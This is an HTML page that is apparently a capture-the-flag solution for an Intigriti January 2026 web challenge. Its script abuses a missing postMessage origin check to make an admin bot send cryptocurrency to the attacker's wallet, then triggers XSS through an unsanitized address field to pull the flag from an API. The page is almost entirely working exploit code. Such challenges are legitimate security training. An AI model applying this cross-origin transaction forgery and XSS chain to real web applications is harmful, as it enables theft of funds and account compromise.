<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Exploit</title>
</head>
<body>
    <h3>CTF Exploit - Intigriti January 2026</h3>
    <p>Opening exploit...</p>
    <pre id="log"></pre>

    <script>
        const log = (msg) => {
            document.getElementById('log').textContent += msg + '\n';
            console.log(msg);
        };

        const TARGET = 'https://challenge-0126.intigriti.io';
        const OUR_WALLET = '16472226db03703a192aa383237035a69f';

        log('='.repeat(60));
        log('INTIGRITI JANUARY 2026 CTF EXPLOIT');
        log('='.repeat(60));
        log('Target: ' + TARGET);
        log('Our Wallet: ' + OUR_WALLET);
        log('');

        // ========================================================================
        // PART 1: COIN TRANSFER
        // ========================================================================
        log('[PART 1] Coin Transfer via postMessage vulnerability');
        log('Opening checkout page with 1337COIN...');

        const checkout = window.open(
            TARGET + '/checkout.html?currency=1337COIN&price=1',
            'checkout',
            'width=400,height=500'
        );

        setTimeout(() => {
            log('Sending postMessage to transfer 1 1337COIN...');
            checkout.postMessage({
                type: 'submitTransaction',
                transaction: {
                    toAddress: OUR_WALLET,
                    currency: '1337COIN',
                    amount: 1
                }
            }, '*');
            log('PostMessage sent!');
            log('Admin will send 1 1337COIN to: ' + OUR_WALLET);
            log('');

            // ========================================================================
            // PART 2: XSS - Trigger alert('gigawatz')
            // ========================================================================
            log('[PART 2] XSS Payload');
            log('Opening marketwatch to display transaction...');

            setTimeout(() => {
                const mw = window.open(TARGET + '/marketwatch.html', 'marketwatch', 'width=700,height=500');
                log('Marketwatch opened');
                log('');

                // ========================================================================
                // SUMMARY
                // ========================================================================
                log('='.repeat(60));
                log('EXPLOIT SUMMARY');
                log('='.repeat(60));
                log('Vulnerabilities exploited:');
                log('1. postMessage origin validation bypass in checkout.html');
                log('2. Unsanitized address display in marketwatch "To" column');
                log('');
                log('Expected results:');
                log('- 1 1337COIN sent to: ' + OUR_WALLET);
                log('- Alert triggered: alert("gigawatz")');
                log('- Flag retrieved from /api/me');
                log('');
                log('Admin bot processing: ~30 seconds');

            }, 2000);

        }, 2000);
    </script>
</body>
</html>
